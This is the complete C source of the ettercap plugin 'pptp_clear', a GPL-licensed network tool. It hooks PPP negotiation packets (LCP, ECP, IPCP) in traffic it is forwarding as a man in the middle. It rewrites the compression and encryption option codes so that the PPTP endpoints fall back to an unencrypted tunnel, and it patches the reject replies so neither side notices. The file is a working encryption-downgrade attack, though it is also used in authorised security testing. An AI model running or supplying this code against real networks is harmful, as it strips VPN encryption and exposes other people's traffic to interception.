/*
    pptp_clear -- ettercap plugin -- Tries to force PPTP cleartext connections

    Copyright (C) ALoR & NaGA
    
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.

*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>


struct ppp_lcp_header {
   u_char  code;
   u_char  ident;
   u_int16 length;
};

#define PPP_CONFIGURE_REQUEST   0x01
#define PPP_CONFIGURE_REJ   	0x04

#define PPP_REQUEST_FCOMP	0x07
#define PPP_REQUEST_ACOMP	0x08
#define PPP_REQUEST_VJC		0x02

#define PPP_REQUEST_DUMMY1	0xe7
#define PPP_REQUEST_DUMMY2	0x7e

#define PPP_OBFUSCATE		0x30


/* protos */
int plugin_load(void *);
static int pptp_clear_init(void *);
static int pptp_clear_fini(void *);

static void parse_lcp(struct packet_object *po);
static void parse_ecp(struct packet_object *po);
static void parse_ipcp(struct packet_object *po);
static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len);
static void obfuscate_options(u_char * buffer, int16 tot_len);

/* plugin operations */
struct plugin_ops pptp_clear_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "pptp_clear",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "PPTP: Tries to force cleartext tunnel",  
   /* the plugin version. */ 
   .version =           "1.0",   
   /* activation function */
   .init =              &pptp_clear_init,
   /* deactivation function */                     
   .fini =              &pptp_clear_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &pptp_clear_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int pptp_clear_init(void *dummy) 
{
   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("pptp_clear: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }

   USER_MSG("pptp_clear: plugin running...\n");
   
   hook_add(HOOK_PACKET_LCP, &parse_lcp);
   hook_add(HOOK_PACKET_ECP, &parse_ecp);
   hook_add(HOOK_PACKET_IPCP, &parse_ipcp);
   return PLUGIN_RUNNING;   
}


static int pptp_clear_fini(void *dummy) 
{
   USER_MSG("pptp_clear: plugin terminated...\n");

   hook_del(HOOK_PACKET_LCP, &parse_lcp);
   hook_del(HOOK_PACKET_ECP, &parse_ecp);
   hook_del(HOOK_PACKET_IPCP, &parse_ipcp);
   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Clear Header Compression */
static void parse_lcp(struct packet_object *po)
{
   struct ppp_lcp_header *lcp;
   u_char *option;
   
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 

   lcp = (struct ppp_lcp_header *)po->L4.header;

   if ( lcp->code == PPP_CONFIGURE_REQUEST) {
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_FCOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_DUMMY1;      
      
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_ACOMP, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_DUMMY2;      
   }

   if ( lcp->code == PPP_CONFIGURE_REJ) {
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_FCOMP;      
      
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY2, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_ACOMP;      
   }
}


/* Clear Compression and Encryption */
static void parse_ecp(struct packet_object *po)
{
   struct ppp_lcp_header *lcp;
   
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 

   lcp = (struct ppp_lcp_header *)po->L4.header;

   if (lcp->code == PPP_CONFIGURE_REQUEST || lcp->code == PPP_CONFIGURE_REJ)
      obfuscate_options((u_char *)(lcp + 1), ntohs(lcp->length)-sizeof(*lcp));
}


/* Clear Van Jacobson Compression */
static void parse_ipcp(struct packet_object *po)
{
   struct ppp_lcp_header *lcp;
   u_char *option;
   
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 

   lcp = (struct ppp_lcp_header *)po->L4.header;

   if ( lcp->code == PPP_CONFIGURE_REQUEST) 
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_VJC, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_DUMMY1;      
          
   if ( lcp->code == PPP_CONFIGURE_REJ)
      if ( (option = (u_char *)parse_option( (u_char *)(lcp + 1), PPP_REQUEST_DUMMY1, ntohs(lcp->length)-sizeof(*lcp))) !=NULL)       
         option[0] = PPP_REQUEST_VJC;      
}


/* Search an option in the packet */
static u_char *parse_option(u_char * buffer, u_char option, int16 tot_len)
{
   /* Avoid never-ending parsing on bogus packets ;) */
   char counter=0;
   
   while (tot_len>0 && *buffer!=option && counter<20) {	
      tot_len -= buffer[1];
      buffer += buffer[1];
      counter++;
   }
   
   if (*buffer == option) 
      return buffer;
      
   return NULL;
}


/* Change the requested options to something unknown
 * and viceversa
 */
static void obfuscate_options(u_char * buffer, int16 tot_len)
{
   char counter=0;
   while (tot_len>0 && counter<20) {
      if (buffer[0]>0 && buffer[0]!=0xff) 
         buffer[0]^=PPP_OBFUSCATE;
		
      tot_len -= buffer[1];
      buffer += buffer[1];

      counter++;
   }
}

/* EOF */

// vim:ts=3:expandtab
 
